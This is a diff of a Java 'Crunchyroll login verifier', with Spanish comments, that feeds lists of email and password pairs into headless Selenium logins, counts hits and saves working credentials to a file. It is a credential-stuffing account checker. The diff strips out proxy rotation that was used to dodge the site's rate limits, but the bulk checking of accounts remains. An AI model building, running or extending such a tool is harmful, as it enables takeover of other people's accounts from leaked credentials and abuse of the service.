@@ -19,13 +19,11 @@ public class LoginTester {
     private static final String SUCCESS_FILE_PATH = "C:\\Users\\Shiroh\\Documents\\CrunchyChecker\\exit.txt";
     private static final String FAILED_FILE_PATH = "C:\\Users\\Shiroh\\Documents\\CrunchyChecker\\fail.txt";
     private static final boolean USE_HEADLESS_MODE = true;
-    private static final int MAX_PROXY_RETRIES = 3; // Máximo número de proxies a intentar por credencial
 
     private static int successCount = 0;
     private static int failCount = 0;
     private static final List<String> successfulEmails = new ArrayList<>();
     private static final List<String> failedEmails = new ArrayList<>();
-    private static ProxyManager proxyManager;
 
     static {
         LogManager.getLogManager().reset();
@@ -51,22 +49,12 @@ public class LoginTester {
     }
 
     public static void main(String[] args) {
-        System.out.println("╔══════════════════════════════════════════════════════════╗");
+        System.out.println("╔══════════════════════════════════════��═══════════════════╗");
         System.out.println("║                                                          ║");
         System.out.println("║        🌟 CRUNCHYROLL LOGIN VERIFIER 🌟                 ║");
-        System.out.println("║           Con Soporte de Proxies 🔄                     ║");
+        System.out.println("║           Verificación de Credenciales                  ║");
         System.out.println("║                                                          ║");
         System.out.println("╚══════════════════════════════════════════════════════════╝");
-
-        // Inicializar ProxyManager
-        System.out.println("🔧 Inicializando sistema de proxies...");
-        proxyManager = new ProxyManager();
-
-        if (proxyManager.getProxyCount() > 0) {
-            System.out.println("✅ Sistema de proxies activado con " + proxyManager.getProxyCount() + " proxies disponibles");
-        } else {
-            System.out.println("⚠️ No hay proxies disponibles, continuando sin proxy");
-        }
 
         Set<String> alreadyTested = new HashSet<>();
         alreadyTested.addAll(loadCredentials(SUCCESS_FILE_PATH));
@@ -96,7 +84,7 @@ public class LoginTester {
 
         for (int i = 0; i < filtered.size(); i++) {
             CredentialExtractor.UserCredential credential = filtered.get(i);
-            processCredentialWithProxyRetry(credential, i + 1, filtered.size());
+            processCredential(credential, i + 1, filtered.size());
 
             if (i < filtered.size() - 1) {
                 try {
@@ -111,93 +99,31 @@ public class LoginTester {
         printSummary(filtered.size());
     }
 
-    private static void processCredentialWithProxyRetry(CredentialExtractor.UserCredential credential, int current, int total) {
-        AuthenticationResult finalResult = null;
-        ProxyManager.ProxyInfo currentProxy = null;
-        int proxyAttempts = 0;
-        boolean rateLimitDetected = false;
+    private static void processCredential(CredentialExtractor.UserCredential credential, int current, int total) {
+        AuthenticationResult result = null;
 
-        // Primer intento sin proxy
         try (SeleniumLoginService service = new SeleniumLoginService(USE_HEADLESS_MODE)) {
-            finalResult = service.performLogin(credential.getEmail(), credential.getPassword());
-
-            if (finalResult.getErrorMessage() != null && finalResult.getErrorMessage().startsWith("RATE_LIMIT:")) {
-                rateLimitDetected = true;
-                System.out.println("⚠️ [" + current + "/" + total + "] Límite de solicitudes detectado para: " + credential.getEmail());
-            }
+            result = service.performLogin(credential.getEmail(), credential.getPassword());
         } catch (Exception e) {
-            System.out.println("❌ Error procesando " + credential.getEmail() + " sin proxy: " + e.getMessage());
+            System.out.println("❌ Error procesando " + credential.getEmail() + ": " + e.getMessage());
         }
 
-        // Si se detectó límite de solicitudes y hay proxies disponibles, intentar con proxies
-        if (rateLimitDetected && proxyManager.getValidProxyCount() > 0) {
-            System.out.println("🔄 Intentando con proxies para: " + credential.getEmail());
-
-            while (proxyAttempts < MAX_PROXY_RETRIES && proxyManager.getValidProxyCount() > 0) {
-                proxyAttempts++;
-                currentProxy = proxyManager.getNextProxy();
-
-                if (currentProxy == null) {
-                    System.out.println("❌ No hay más proxies válidos disponibles");
-                    break;
-                }
-
-                System.out.println("🔄 [" + current + "/" + total + "] Intento " + proxyAttempts + " con proxy " + currentProxy + " para: " + credential.getEmail());
-
-                try (SeleniumLoginService service = new SeleniumLoginService(USE_HEADLESS_MODE, currentProxy)) {
-                    finalResult = service.performLogin(credential.getEmail(), credential.getPassword());
-
-                    // Evaluar el resultado y marcar el proxy apropiadamente
-                    if (finalResult.getErrorMessage() == null || !finalResult.getErrorMessage().startsWith("RATE_LIMIT:")) {
-                        // Proxy funcionó correctamente
-                        proxyManager.markProxyAsValid(currentProxy);
-                        System.out.println("✅ Proxy " + currentProxy + " funcionó correctamente para: " + credential.getEmail());
-                        break;
-                    } else {
-                        // Proxy también tiene límite de solicitudes
-                        proxyManager.markProxyAsFailure(currentProxy);
-                        System.out.println("⚠️ Proxy " + currentProxy + " también tiene límite de solicitudes para: " + credential.getEmail());
-                    }
-                } catch (Exception e) {
-                    // Error con el proxy - marcarlo como inválido
-                    proxyManager.markProxyAsInvalid(currentProxy);
-                    System.out.println("❌ Error procesando " + credential.getEmail() + " con proxy " + currentProxy + ": " + e.getMessage());
-                    finalResult = new AuthenticationResult(credential.getEmail(), false, "Error con proxy: " + e.getMessage());
-                }
-
-                // Pequeña pausa entre intentos de proxy
-                try {
-                    Thread.sleep(2000);
-                } catch (InterruptedException e) {
-                    Thread.currentThread().interrupt();
-                    break;
-                }
-            }
-
-            // Mostrar estado actual de proxies después de los intentos
-            if (proxyAttempts > 0) {
-                proxyManager.printProxyStatus();
-            }
-        }
-
-        // Procesar el resultado final
-        if (finalResult != null) {
-            String proxyInfo = currentProxy != null ? " (usando proxy " + currentProxy + ")" : "";
-
-            if (finalResult.isSuccess()) {
+        // Procesar el resultado
+        if (result != null) {
+            if (result.isSuccess()) {
                 successCount++;
                 successfulEmails.add(credential.getEmail());
-                System.out.println("✅ [" + current + "/" + total + "] LOGIN EXITOSO: " + credential.getEmail() + proxyInfo);
+                System.out.println("✅ [" + current + "/" + total + "] LOGIN EXITOSO: " + credential.getEmail());
                 saveCredential(SUCCESS_FILE_PATH, credential.getEmail(), credential.getPassword(), "");
             } else {
                 failCount++;
                 failedEmails.add(credential.getEmail());
 
-                String errorMsg = finalResult.getErrorMessage();
+                String errorMsg = result.getErrorMessage();
                 if (errorMsg != null && errorMsg.startsWith("RATE_LIMIT:")) {
-                    System.out.println("🚫 [" + current + "/" + total + "] LÍMITE ALCANZADO: " + credential.getEmail() + " - " + errorMsg + proxyInfo);
+                    System.out.println("🚫 [" + current + "/" + total + "] LÍMITE ALCANZADO: " + credential.getEmail() + " - " + errorMsg);
                 } else {
-                    System.out.println("❌ [" + current + "/" + total + "] LOGIN FALLIDO: " + credential.getEmail() + " - " + errorMsg + proxyInfo);
+                    System.out.println("❌ [" + current + "/" + total + "] LOGIN FALLIDO: " + credential.getEmail() + " - " + errorMsg);
                 }
 
                 if (errorMsg != null &&
@@ -253,9 +179,6 @@ public class LoginTester {
         System.out.println("║ ✅ Exitosas: " + String.format("%-57s", successCount) + "║");
         System.out.println("║ ❌ Fallidas: " + String.format("%-57s", failCount) + "║");
         System.out.println("║ 🚀 Tasa de éxito: " + String.format("%-50s", String.format("%.2f%%", rate)) + "║");
-        if (proxyManager.getProxyCount() > 0) {
-            System.out.println("║ 🔄 Proxies utilizados: " + String.format("%-47s", proxyManager.getProxyCount()) + "║");
-        }
         System.out.println("╚══════════════════════════════════════════════════════════════════════╝");
 
         if (!successfulEmails.isEmpty()) {
@@ -283,10 +206,6 @@ public class LoginTester {
             System.out.println("🎉 ¡Credenciales válidas encontradas!");
         } else {
             System.out.println("🔍 No se encontraron credenciales válidas.");
-        }
-
-        if (proxyManager.getProxyCount() > 0) {
-            System.out.println("🔄 Sistema de proxies activo - Se rotaron proxies automáticamente cuando se detectaron límites.");
         }
     }
 }
